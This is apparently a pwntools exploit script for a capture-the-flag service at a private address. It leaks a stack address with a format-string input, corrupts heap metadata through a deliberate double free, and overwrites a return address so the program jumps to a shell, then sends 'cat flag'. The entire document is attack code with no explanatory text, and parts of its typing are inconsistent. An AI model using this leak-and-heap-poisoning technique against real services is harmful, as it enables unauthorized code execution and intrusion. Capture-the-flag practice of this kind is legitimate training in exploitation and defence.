import pwn

#Remote server at IP 10.21.232.3 and port 10101

proc = pwn.remote('10.21.232.3', 10101)

import struct
import sys


def remove(user: int):
    proc.sendline( "d".encode() )
    proc.sendline( user.encode() )

def add(name: bytes):
    proc.sendline( "g".encode() )
    proc.sendline( name )        
done = "x\n"

name = "%10$p"

TEAMNAME =   0x400dfa #binsh address

proc.sendline(name.encode())
addr = proc.recvuntil(b'Hi ')
addr = proc.recvuntil(b'!')
addr = addr.decode()
addr = addr[:len(addr)-1]
result = int(addr, 16) + 8
write_addr = result #return address

for i in range(9): #[0, 8]
    add(b"ABCD")


for i in range(1, 8): # [1, 7]
    remove( str(i-1) )

remove( str(7) )
remove( str(8) )
remove( str(7) )


for i in range(7): #[0, 6]
    add("ABCD")

    
add(struct.pack("<Q", write_addr))
add(b"ABCD")
add(b"ABCD")
add(struct.pack("<Q", TEAMNAME))

proc.sendline(done.encode())

cmd = "cat flag"
proc.sendline(cmd.encode())

proc.interactive()
proc.close()

